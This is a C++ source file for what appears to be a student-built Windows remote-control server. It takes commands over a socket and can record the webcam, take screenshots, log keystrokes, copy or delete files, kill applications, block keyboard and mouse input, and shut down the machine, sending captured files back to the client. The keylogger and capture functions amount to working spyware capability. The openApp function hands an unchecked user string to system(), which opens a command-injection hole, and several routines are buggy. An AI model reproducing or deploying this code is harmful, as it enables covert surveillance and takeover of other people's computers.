#include "initServer.h"
#include "function.h"
#include <filesystem> 
#include<opencv2/opencv.hpp>
#define PORT 8080
#define BUFFER_SIZE 1024
#define KEY 0x5A

// Bat ctrl-C
void signal_callback_handler(int signum, SOCKET clientSocket) {
    cout << "                    ";
    cout << "Caught signal " << signum << "\n";
    closesocket(clientSocket); 
    WSACleanup(); 
    Sleep(1000); 
    exit(signum);
}

// Hien thi hoac an con tro chuot
void showCur(bool CursorVisibility) {
    CONSOLE_CURSOR_INFO ConCurInf;
    ConCurInf.dwSize = 10;                
    ConCurInf.bVisible = CursorVisibility; // Dieu chinh trang thai hien thi cua con tro
    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &ConCurInf);
}

void openWebcam(SOCKET ClientSocket, int n) {
    int time = n;
    n = n + (int)n / 2 + 2;
     
    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
    // Mo webcam (camera 0)
    VideoCapture cap(0);
    if (!cap.isOpened()) {
        cout << "                    ";
        cerr << "Error: Cannot open the webcam.\n";
        return;
    }

    // Lay kich thuoc
    int frameWidth = static_cast<int>(cap.get(CAP_PROP_FRAME_WIDTH));
    int frameHeight = static_cast<int>(cap.get(CAP_PROP_FRAME_HEIGHT));
    double fps = 30.0;

    // Duong dan luu video
    string outputFilePath = "C:\\Users\\Public\\output.mp4";
    // Khoi tao videoWriter
    cv::VideoWriter writer(outputFilePath, cv::VideoWriter::fourcc('m', 'p', '4', 'v'), fps, cv::Size(frameWidth, frameHeight));

    if (!writer.isOpened()) {
        cout << "                    ";
        cerr << "Error: Cannot open VideoWriter to save the video.\n";
        return;
    }
    cout << "                    ";
    cout << "Recording video for " << time << " seconds.\n";

    auto startTime = chrono::steady_clock::now();

    while (true) {
        Mat frame;
        cap >> frame;

        if (frame.empty()) {
            cout << "                    ";
            cerr << "Error: Empty frame captured!\n";
            break;
        }

        writer.write(frame);
        imshow("Recording", frame);

        if (waitKey(30) >= 0) break;

        auto currentTime = chrono::steady_clock::now();
        if (chrono::duration_cast<chrono::seconds>(currentTime - startTime).count() >= n) {
            break;
        }
    }
  
    // Giai phong tai nguyen
    cap.release();
    writer.release();
    destroyAllWindows();
    responseToClient(ClientSocket, "Recording successfully!", outputFilePath.c_str());
}

// Tat webcam
void stopWebcam(SOCKET ClientSocket) {
#ifdef _WIN32
    // Dong ung dung camera tren Windows
    system("taskkill /IM WindowsCamera.exe /F");
    responseToClient(ClientSocket,"Stop Webcam successfully!", NULL);
#elif __APPLE__
    // Dong ung dung Photo booth tren MacOS
    system("pkill \"Photo Booth\"");
#elif __linux__
    // Dong ung dung Cheese tren Linux
    system("pkill cheese");
#else
#error "no access!" // Ngoai tru cac he dieu hanh tren
#endif
}

// Chuyen doi tu char* sang LPWSTR 
LPWSTR ConvertToLPWSTR(const char* str) {
    int sizeRequired = MultiByteToWideChar(CP_UTF8, 0, str, -1, nullptr, 0);
    LPWSTR lpwstr = new wchar_t[sizeRequired];
    MultiByteToWideChar(CP_UTF8, 0, str, -1, lpwstr, sizeRequired);
    return lpwstr;
}

// Chuyen doi tu LPWSTR sang string
string ConvertLPWSTRToString(LPWSTR lpwstr) {
    wstring_convert<codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(lpwstr);
}

// Luu anh bitmap vao file
void saveBitmap(HBITMAP hBitmap, const char* filename) {
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp); 

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    DWORD dwSize;
    BYTE* pBitmap;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    dwSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    pBitmap = new BYTE[dwSize];

    HDC hdc = GetDC(NULL);
    GetDIBits(hdc, hBitmap, 0, bmp.bmHeight, pBitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    // Tao file bitmap
    LPWSTR hfilename = ConvertToLPWSTR(filename);
    HANDLE hFile = CreateFile(hfilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        delete[] pBitmap;    
        return;
    }

    bmfHeader.bfType = 0x4D42; 
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    DWORD written;
    WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &written, NULL);
    WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &written, NULL);
    WriteFile(hFile, pBitmap, dwSize, &written, NULL);

    CloseHandle(hFile);
    delete[] pBitmap;
}

// SCREENSHOT
void takeScreenshot(const char* filename, SOCKET ClientSocket) {
    // Lay thong tin man hinh
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    RECT rc;
    GetClientRect(GetDesktopWindow(), &rc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, rc.right, rc.bottom);
    SelectObject(hdcMem, hBitmap);

    // Chup anh man hinh
    BitBlt(hdcMem, 0, 0, rc.right, rc.bottom, hdcScreen, 0, 0, SRCCOPY);

    // Luu anh vao file
    saveBitmap(hBitmap, filename);

    // Don dep
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    // Phan hoi qua email
    char path[] = "C:\\Users\\Public\\screenshot.bmp";
    responseToClient(ClientSocket,"Screenshot successfully!", path);
}

// Liet ke danh sach cac ung dung trong may
string ListInstalledApplications(SOCKET ClientSocket) {
    CoInitialize(nullptr); 

    IShellItem* pApps = nullptr;
    HRESULT hr = SHGetKnownFolderItem(FOLDERID_AppsFolder, KF_FLAG_DEFAULT, nullptr, IID_PPV_ARGS(&pApps)); // Lay thu muc ung dung
    if (FAILED(hr)) {
        cout << "                    ";
        cerr << "Failed to get Apps folder. Error code = 0x" << hex << hr << '\n';
        CoUninitialize();
        return "";
    }

    IEnumShellItems* ItemList = nullptr;
    hr = pApps->BindToHandler(nullptr, BHID_EnumItems, IID_PPV_ARGS(&ItemList)); // Bat dau qua trinh quet cac ung dung
    if (FAILED(hr)) {
        cout << "                    ";
        cerr << "Failed to bind to handler. Error code = 0x" << hex << hr << '\n';
        pApps->Release();
        CoUninitialize();
        return NULL; 
    }

    string listOfInstalledApp = "LIST OF INSTALLED APPLICATIONS:\n"; 
    int index = 0;
    IShellItem* Item = nullptr;
    // Duyet qua tung ung dung
    while (ItemList->Next(1, &Item, nullptr) == S_OK) { 
        LPWSTR pDisplayName = nullptr;
        hr = Item->GetDisplayName(SIGDN_NORMALDISPLAY, &pDisplayName); 
        if (SUCCEEDED(hr)) {
            ATLTRACE(L"Found: %s\n", pDisplayName);  // Luu ten ung dung vao ket qua
            index++;
            listOfInstalledApp = listOfInstalledApp + to_string(index) + ". " + ConvertLPWSTRToString(pDisplayName) + "\n";
            CoTaskMemFree(pDisplayName);             // Giai phong bo nho
        }
        Item->Release();
    }
    // Don dep
    ItemList->Release();
    pApps->Release();
    CoUninitialize();

    ofstream appFile("C:\\Users\\Public\\listOfApp.txt", ios::out);
    appFile << listOfInstalledApp;
    appFile.close();

    responseToClient(ClientSocket, "List of applications:", "C:\\Users\\Public\\listOfApp.txt");
    return listOfInstalledApp; // listOfInstalledApp: danh sach cac ung dung da tai
}

// Lay file tu duong dan 
string getFileNameFromPath(string filePath) {
    string name = "";
    int index = filePath.length() - 1;
    while (true) {
        if (filePath[index] == '\\') break; // Tach file bang dau "\\"
        name = filePath[index] + name; // Them ky tu vua tach duoc vao file
        index--;
    }
    return name;
}

// Xoa file tu duong dan
void deleteFile(string filePath, SOCKET ClientSocket) {
    if (remove(filePath.c_str()) == 0) { 
        responseToClient(ClientSocket,"Delete file successfully!", NULL); 
    }
    else {
        responseToClient(ClientSocket, "Fail to delete file!", NULL); 
    }
}

// Sao chep file tu nguon toi dich
bool copyFile(const string& source, const string& destination, SOCKET ClientSocket) {
    ifstream src(source, ios::binary); 
    if (!src) {
        responseToClient(ClientSocket, "Error: Source file does not exist!", NULL);
        return false;
    }

    string name = getFileNameFromPath(source); 
    ofstream dest(destination + "\\" + name, ios::binary); 
    if (!dest || destination == "") {
        responseToClient(ClientSocket, "Error: Destination folder not valid!", NULL); 
        return false;
    }

    dest << src.rdbuf(); // Sao chep noi dung tu nguon sang dich
    responseToClient(ClientSocket, "Copy file completed!", NULL); 
    dest.close();
    return true;
}

// Shutdown hoac Restart may tinh sau mot khoang thoi gian
void shutDownOrRestart(int choice, SOCKET ClientSocket) {
    if (choice == 1) {
        responseToClient(ClientSocket, "Shutdown computer successfully!", NULL);
        system("C:\\windows\\system32\\shutdown /s /t 10"); // Shutdown may tinh sau 10 giay
    }
    else {
        responseToClient(ClientSocket,"Restart computer successfully!", NULL);
        system("C:\\windows\\system32\\shutdown /r /t 10"); // Restart may tinh sau 10 giay
    }
}

// Liet ke tat ca cua so dang mo
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    int length = GetWindowTextLength(hwnd);  // Lay do dai cua tieu de cua so
    if (length == 0 || !IsWindowVisible(hwnd)) { // Bo qua cac cua so khong co tieu de hoac khong hien thi
        return TRUE;
    }
    // Tao mot chuoi wide de luu tru tieu de cua so
    wstring windowTitle(length + 1, L'\0');
    GetWindowText(hwnd, &windowTitle[0], length + 1); 
    windowTitle.resize(length); // Loai bo ky tu NULL du thua

    DWORD processID;
    GetWindowThreadProcessId(hwnd, &processID); // Lay ID cua tien trinh ung voi cua so nay

    // Chuyen lParam thanh vector<Application> và them thong tin cua ung dung tim duoc
    auto apps = reinterpret_cast<vector<Application>*>(lParam);
    apps->push_back({ hwnd, windowTitle.empty() ? L"(Untitled)" : windowTitle, processID });

    return TRUE;
}

// Liet ke tat ca cac ung dung dang chay
vector<Application> listApplications() {
    vector<Application> apps;
    EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&apps));
    return apps;
}

// Dong cua so ung dung dua tren HWND
void closeApplicationByHWND(HWND hwnd, SOCKET ClientSocket) {
    SendMessage(hwnd, WM_CLOSE, 0, 0); 
    Sleep(500);
    // Kiem tra ung dung co dang chay hay khong
    if (IsWindow(hwnd)) {
        responseToClient(ClientSocket, "Cannot stop the process!", NULL);
    }
    else {
        responseToClient(ClientSocket, "Stop process successfully!", NULL); 
    }
}

// Ket thuc tien trinh dua tren Process ID (PID)
void terminateProcessByID(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID); // Mo tien trinh voi quyen ket thuc
    if (hProcess) {
        CloseHandle(hProcess); // Dong handle cac tien trinh
    }
    else {
        cout << "                    ";
        wcerr << L"Unable to open process handle. Error code: " << GetLastError() << L"\n";
    }
}
// Ham chuyen doi kieu wide sang kieu string
string ConvertWStringToString(const wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size_needed, NULL, NULL); // Chuyển đổi
    return str;
}

// Ham tao chuoi danh sach ung dung dang chay tren may tinh
string printListOfProcess(const vector<Application>& app) {
    string ListOfProcess = "";
    int index = 0;
    for (size_t i = 0; i < app.size(); ++i) {
        ListOfProcess += to_string(++index) + "." + ConvertWStringToString(app[i].windowTitle);
        ListOfProcess += '\n';
    }
    return ListOfProcess;
}

// Ham dung ung dung dua tren lua chon
void stopApp(vector<Application>& apps, int choice, SOCKET ClientSocket)
{
    if (choice == 0) {
        return; // Thoat ra neu khong lua chon nua
    }

    if (choice > 0 && choice <= static_cast<int>(apps.size())) {
        // Ham dong cua so neu lua chon hop le
        closeApplicationByHWND(apps[choice - 1].hwnd, ClientSocket);

        if (IsWindow(apps[choice - 1].hwnd)) {
            terminateProcessByID(apps[choice - 1].processID);
        }
    }
    else {
        cout << "                    ";
        wcerr << L"Invalid selection of application.\n"; // Bao loi khi chon ung dung khong hop le
        responseToClient(ClientSocket,"Unable to close the app, please verify your input!", NULL); 
    }
}

// Ham liet ke va dung ung dung
void listProcess(SOCKET ClientSocket)
{
    vector<Application> apps = listApplications(); // Lay danh sach ung dung
    string s = printListOfProcess(apps); // Tao chuoi mo ta cac ung dung
    responseToClient(ClientSocket,"LIST OF RUNNING PROCESSES:\n" + s, NULL); 
}

void keyLogger(int second,SOCKET ClientSocket) {
    ofstream logFile("C:\\Users\\Public\\keylogger.txt", ios::out); // Tao file ghi lai cac phim da nhan
    if (!logFile.is_open()) { 
        responseToClient(ClientSocket,"Cannot open file!", NULL);
        return;
    }
    // Mang theo doi trang thai cac phim (true neu cac phim duoc ghi lai)
    bool keyLogged[256] = { false };

    auto start = chrono::steady_clock::now();
    auto end = start + chrono::seconds(second); 
    cout << "                    ";
    cout << "The user's pushed keys: ";
    while (chrono::steady_clock::now() < end) {
        for (int key = 8; key <= 255; ++key) {
            // Kiểm tra xem phím có được nhấn và chưa được ghi lại không
            if ((GetAsyncKeyState(key) & 0x8000) && !keyLogged[key]) {
                keyLogged[key] = true;             
                if (key >= 0x30 && key <= 0x5A) {
                    logFile << static_cast<char>(key); // Ghi vao file keylogger.txt
                    cout << static_cast<char>(key);    // hien thi len man hinh
                }
                // Ghi lai cac phim dac biet voi nhan
                else {
                    switch (key) {
                    case VK_SPACE: logFile << "[SPACE]"; cout << "[SPACE]"; break;
                    case VK_RETURN: logFile << "[ENTER]"; cout << "[ENTER]"; break;
                    case VK_TAB: logFile << "[TAB]"; cout << "[TAB]"; break;
                    case VK_BACK: logFile << "[BACKSPACE]"; cout << "[BACKSPACE]"; break;
                    case VK_SHIFT: logFile << "[SHIFT]"; cout << "[SHIFT]"; break;
                    case VK_CONTROL: logFile << "[CTRL]"; cout << "[CTRL]"; break;
                    case VK_MENU: logFile << "[ALT]"; cout << "[ALT]"; break;
                    default: break;
                    }
                }
                logFile.flush(); // Đam bao du lieu duoc ghi ngay lap tuc vao file
            }
            // Reset trang thai phim da duoc nha
            else if (!(GetAsyncKeyState(key) & 0x8000)) {
                keyLogged[key] = false;
            }
        }
        this_thread::sleep_for(chrono::milliseconds(10));
    }
    cout << "\n";
    logFile.close();
    char path[] = "C:\\Users\\Public\\keylogger.txt";
    responseToClient(ClientSocket,"Keylogger saved successfully!",path);
}

// Ham lay thong tin pin
void checkBatteryStatus(SOCKET ClientSocket) {
    SYSTEM_POWER_STATUS powerStatus;
    if (GetSystemPowerStatus(&powerStatus)) {
        if (powerStatus.ACLineStatus == 0) {
            string pin = to_string((int)(powerStatus.BatteryLifePercent));
            responseToClient(ClientSocket,"Battery is being used without plugged in.\nCurrent Battery Level: " + pin + "%", NULL);
        }
        else {
            string pin = to_string((int)(powerStatus.BatteryLifePercent));
            responseToClient(ClientSocket,"Laptop is plugged in.\nCurrent Battery Level: " + pin + ".", NULL);
        }
    }
    else {
        responseToClient(ClientSocket,"Cannot check batery status!", NULL);
    }
}

// Ham khoa phim trong n giay
void lockKeyboardAndMouse(int seconds, SOCKET ClientSocket) {
    cout << "                    ";
    cout << "Locking keyboard and mouse for " << seconds << " seconds...\n";
    BlockInput(TRUE);  // Khoa ban phim va chuot
    // Tam dung chuong trinh trong (seconds) giay
    this_thread::sleep_for(chrono::seconds(seconds));
    // Mo khoa phim va chuot
    BlockInput(FALSE);
    responseToClient(ClientSocket, "Keyboard is locked in " + to_string(seconds), NULL);
}

// Ham doi backgound may tinh
void setWallpaper(string imagePath, SOCKET ClientSocket) {
    // Chuyen string thanh wstring
    wstring wideImagePath(imagePath.begin(), imagePath.end());
    // Goi SystemParametersInfo voi wstring
    int result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)wideImagePath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    if(result==0) responseToClient(ClientSocket, "Unable to change background, check your image path!", NULL);
    else if (result == 1) responseToClient(ClientSocket, "Change background completed!!", NULL);
}

// Ham mo app da tai
void openApp(string name, SOCKET ClientSocket) {
    string command = "start ";

    if (name == "visual studio") command += "devenv";
    else if (name == "command prompt") command += "cmd";
    else if (name == "google chrome") command += "chrome";
    else if (name == "microsoft edge") command += "msedge";
    else if (name == "paint") command += "mspaint";
    else if (name == "calculator") command += "calc";
    else if (name == "microsoft word") command += "winword";
    else if (name == "powerpoint") command += "powerpnt";
    else {
        command += name;  // Noi ten ung dung voi lenh "start"
    }

    int result = system(command.c_str());
    if (result == 0) {
        responseToClient(ClientSocket,"Open "+name+" completed!", NULL);
    }
    else {
        responseToClient(ClientSocket, "Unable to open "+name+"!", NULL);
    }
}

string wstringToString(const wstring& wstr) {
    string str;
    try {
        wstring_convert<codecvt_utf8<wchar_t>> converter;
        str = converter.to_bytes(wstr);
    }
    catch (const exception& ex) {
        cout << "                    ";
        cerr << "Error converting wstring to string: " << ex.what() << "\n";
    }
    return str;
}
string CheckDiskStorage(const wstring& drive) {
    ULARGE_INTEGER freeBytes;
    ULARGE_INTEGER totalBytes;
    ULARGE_INTEGER availableBytes;

    string ans = "";
    // Lay thong tin dung luong con trong (free) trong o dia 
    if (GetDiskFreeSpaceEx(drive.c_str(), &availableBytes, &totalBytes, &freeBytes)) {
        // Hien thi thong tin ve tong dung luong, dung luong con trong, co san
        ans += "Disk: " + wstringToString(drive);
        ans = ans + "\nTotal space: " + to_string(totalBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
        ans = ans + "\nFree space: " + to_string(freeBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
        ans = ans + "\nAvailable space: " + to_string(availableBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
    }
    else {
        cout << "                    ";
        wcerr << L"Error: Unable to get disk space information for " << drive << '\n';
    }
    return ans;
}

vector<wstring> GetAllDrives() {
    vector<wstring> drives;

    // Lay size cua cua bien de luu giu ten cac o dia
    DWORD bufferSize = GetLogicalDriveStrings(0, nullptr);
    if (bufferSize == 0) {
        cout << "                    ";
        wcerr << L"Error: Unable to retrieve drive information." << '\n';
        return drives;
    }
    wchar_t* buffer = new wchar_t[bufferSize];
    if (GetLogicalDriveStrings(bufferSize, buffer) == 0) {
        cout << "                    ";
        wcerr << L"Error: Unable to retrieve drive information." << '\n';
        delete[] buffer;
        return drives;
    }
    // Xu ly o dia trong tung bien 
    wchar_t* drive = buffer;
    while (*drive) {
        drives.push_back(drive);
        drive += wcslen(drive) + 1;
    }
    delete[] buffer;
    return drives;
}

void checkStorage(SOCKET ClientSocket) {
    vector<wstring> drives = GetAllDrives();
    string ans = "";

    for (const auto& drive : drives) {
        ans = ans + "\n" + CheckDiskStorage(drive);
    }
    if (ans != "") {
        responseToClient(ClientSocket, "Computer storage info:\n" + ans, NULL);
    }
    else {
        responseToClient(ClientSocket, "Cannot check storage info!", NULL);
    }
}

// Ham kiem tra chuoi input co chua dau '\\' (duong dan file hay link)
bool isLink(string inp) {
    for (int i = 0; i < inp.length(); ++i)
        if (inp[i] == '\\') return 1; 
    return 0;
}

// Ham chuyen doi chu hoa thanh chu thuong
string lowerCase(string inp) {
    string ans = "";
    for (int i = 0; i < inp.length(); ++i)
        if (inp[i] >= 'A' && inp[i] <= 'Z') {
            ans += char(int(inp[i]) + 32); 
        }
        else ans += inp[i]; 
    return ans;
}

// Ham kiem tra chuoi input chi la chu so
bool isNum(string inp) {
    for (int i = 0; i < inp.length(); ++i) {
        if (inp[i] < '0' || inp[i] > '9') return 0; 
    }
    return 1; 
}

// Ham lay thong tin lenh tu Email, phan tich chuoi va tra ve cau truc Command
Command getCommandInfoFromEmail(string inp) {
    stringstream ss(inp); // Tach chuoi
    string buffer;
    string act = "", path1 = "", path2 = "";

    while (ss >> buffer) {
        if (act == "") act += lowerCase(buffer);
        else {
            if (path1 == "") path1 = buffer; 
            else path2 = buffer; 
        }
    }

    Command ans;
    ans.act = act; // Luu hanh dong vao struct Command
    ans.path1 = path1; // Luu duong dan 1 vào struct
    ans.path2 = path2; // Luu duong dan 2 vào struct
    return ans;
}

string getFileExtension(const string& filePath) {
    size_t pos = filePath.rfind('.');
    if (pos == string::npos) {
        return ""; // Khong co phan mo rong
    }
    return filePath.substr(pos + 1); // Lay phan mo rong
}

void SendFileToClient(SOCKET clientSocket, string file_path) {
    ifstream file(file_path, ios::binary);
    if (!file.is_open()) {
        send(clientSocket, (char*)("Failed to open file: " + file_path).c_str(), sizeof(("Failed to open file: " + file_path).c_str()), 0);
        return;
    }

    file.seekg(0, ios::end);
    int file_size = file.tellg(); // Lay vi tri cuoi cung trong file
    file.seekg(0, ios::beg); // Di chuyen con tro file ve dau

    // Gui cho client kich thuoc file sap gui
    if (send(clientSocket, reinterpret_cast<char*>(&file_size), sizeof(file_size), 0) == SOCKET_ERROR) {
        cout << "                    ";
        cerr << "Failed to send file size! \n";
        send(clientSocket, "Failed to send file size!", sizeof("Failed to send file size!"), 0);
        file.close();
        return; // Neu gui kich thuoc file that bai, dong file va thoat
    }

    char buffer[BUFFER_SIZE];
    int bytes_sent = 0;
    while (file)
    {
        file.read(buffer, sizeof(buffer));
        int bytes_read = file.gcount();
        if (bytes_read == 0) break;

        int total_sent = 0;
        while (total_sent < bytes_read) {
            int result = send(clientSocket, buffer + total_sent, bytes_read - total_sent, 0);
            if (result == SOCKET_ERROR) {
                cout << "                    ";
                cerr << "Failed to send file data!\n";
                send(clientSocket, "Failed to send file data!", sizeof("Failed to send file data!"), 0);
                file.close();
                return; 
            }
            total_sent += result; // Cap nhat so byte da gui
        }

        bytes_sent += total_sent; // Cap nhat tong so byte da gui
    }
    cout << "                    ";
    cout << "File sent successfully.\n";
    cout << "                    ";
    cout << "The number of bytes sent : ";
    cout << bytes_sent << "/" << file_size << " bytes\n";
    file.close(); 
}

void responseToClient(SOCKET ClientSocket, string response, const char* path) {
    // Kiem tra neu khong co file hay duong dan thi chi gui qua client thong bao
    if (path == NULL) {
        // Gui header de thong bao kieu du lieu la "text" (thong bao)
        string header = "TYPE: text\n";
        send(ClientSocket, header.c_str(), header.length(), 0);
        // Gui phan hoi (response)
        int sendResult = send(ClientSocket, response.c_str(), response.length(), 0);
        if (sendResult == SOCKET_ERROR) {
            cout << "                    ";
            cerr << "Failed to send content.\n";
        }
        else {
            cout << "                    ";
            cout << "Content successfully sent\n";
        }
    }
    else
    {
        // Gui header de thong bao kieu du lieu la "file" kem theo la dinh dang cua file
        string extension = getFileExtension(path);
        if (extension != "") {
            string header = "TYPE: file\nFILE_TYPE: " + extension + "\n";
            send(ClientSocket, header.c_str(), header.length(), 0);
            //send(ClientSocket, response.c_str(), response.length(), 0);
            SendFileToClient(ClientSocket, path);
            //send(ClientSocket, response.c_str(), response.length(), 0); 
        }
        else {
            string header = "TYPE: text\n";
            send(ClientSocket, header.c_str(), header.length(), 0);
            // Gui phan hoi (response)
            string response2 = "Path not valid";
            int sendResult = send(ClientSocket, response2.c_str(), response2.length(), 0);
            if (sendResult == SOCKET_ERROR) {
                cout << "                    ";
                cerr << "Failed to send content.\n";
            }
            else {
                cout << "                    ";
                cout << "Content successfully sent\n";
            }
        }
    }
   
}



